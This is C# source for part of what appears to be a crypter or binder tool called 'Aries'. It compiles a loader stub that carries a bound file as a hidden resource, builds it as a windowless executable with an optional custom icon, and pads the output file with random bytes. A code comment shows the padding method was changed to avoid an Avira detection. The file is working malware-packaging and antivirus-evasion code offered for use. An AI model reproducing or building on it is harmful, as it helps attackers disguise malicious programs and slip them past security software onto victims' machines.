using System;
using System.Text;
using System.CodeDom.Compiler;
using Microsoft.CSharp;
using System.Windows.Forms;

namespace Aries
{
    sealed class CodeDOMCompiler
    {
        /// <summary>
        /// Return the size of a file (used when showing a file size in the debug panel)
        /// </summary>
        /// <param name="bytes">File location if retrieving from a file on the HDD, or a byte array if not</param>
        /// <param name="fromFile">Whether or not the parameter 'bytes' is a file on the HDD</param>
        public static string SetBytes(byte[] bytes, bool fromFile)
        {
            try
            {
                if (fromFile) { bytes = System.IO.File.ReadAllBytes(Encoding.Default.GetString(bytes)); }

                if (bytes.Length >= 1073741824)
                {
                    return String.Format(Convert.ToString(bytes.Length / 1024 / 1024 / 1024), "#0.00") + " GB";
                }
                else if (bytes.Length >= 1048576)
                {
                    return String.Format(Convert.ToString(bytes.Length / 1024 / 1024), "#0.00") + " MB";
                }
                else if (bytes.Length >= 1024)
                {
                    return String.Format(Convert.ToString(bytes.Length / 1024), "#0.00") + " KB";
                }
                else if (bytes.Length < 1024)
                {
                    return bytes.Length + " Bytes";
                }
                return "0 Bytes";
            }

            catch (Exception)
            {
                return "Error retrieving file size";
            }
        }

        /// <summary>
        /// Use the C# Compiler to compile the resource 'LDRsource'.
        /// LDRsource used as a loader to run the stub
        /// </summary>
        /// <param name="InputSource">The C# source to be compiled (LDRsource)</param>
        /// <param name="OutputPE">File to save as</param>
        /// <param name="ResourceFile">The stub + file to bind with, added as a resource to the loader</param>
        /// <param name="icon">Choose whether to compile it with a custom icon (icon.ico)</param>
        public static void Compile(string InputSource, string OutputPE, string ResourceFile, bool icon)
        {
            try
            {
                CodeDomProvider icc = new CSharpCodeProvider();
                CompilerParameters parameters = new CompilerParameters();
                parameters.GenerateExecutable = true;
                parameters.OutputAssembly = OutputPE;
                parameters.WarningLevel = 4;

                //Compiling parameters
                parameters.ReferencedAssemblies.Add("System.dll");
                parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
                parameters.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll");

                if (icon)
                {
                    parameters.CompilerOptions = "/filealign:0x00000200 /optimize+ /platform:anycpu /debug-" +
                        " /target:winexe /win32icon:icon.ico /res:\"" + ResourceFile + "\"";
                }
                else
                {
                    parameters.CompilerOptions = "/filealign:0x00000200 /optimize+ /platform:anycpu /debug-" +
                        " /target:winexe /res:\"" + ResourceFile + "\"";
                }

                //Compiler results
                CompilerResults results = icc.CompileAssemblyFromSource(parameters, InputSource);
                //Check if any errors
                if (results.Errors.Count > 0)
                {
                    foreach (CompilerError CompErr in results.Errors)
                    {
                        MessageBox.Show("Line number: " + CompErr.Line + ", Error Number: " +
                            CompErr.ErrorNumber + ", '" + CompErr.ErrorText + ";",
                            "Error while compiling", MessageBoxButtons.OK);
                    }
                    MessageBox.Show("Error Compiling!");
                    System.Threading.Thread.CurrentThread.Abort();
                }
            }
            catch (Exception)
            {
                System.Threading.Thread.CurrentThread.Abort();
            }
        }


        /// <summary>
        /// Append bytes to the end of the file
        /// </summary>
        /// <param name="FileName">File to append bytes to</param>
        /// <param name="Bytes">number of bytes to append</param>
        public static void pumpFile(string FileName, long Bytes)
        {
            System.IO.FileStream pumpFile = System.IO.File.OpenWrite(FileName);
            long pumpSize = pumpFile.Seek(0, System.IO.SeekOrigin.End);
            byte[] bytarray = new byte[Bytes + 10];

            bytarray = Encoding.UTF8.GetBytes(Util.getRandNum(bytarray.Length));
            //new Random().NextBytes() <- flagged on Avira as TR/Generic

            while (pumpSize < Bytes)
            {
                pumpSize++;
                pumpFile.WriteByte(bytarray[pumpSize]);
            }
            pumpFile.Close();
        }
    }
}
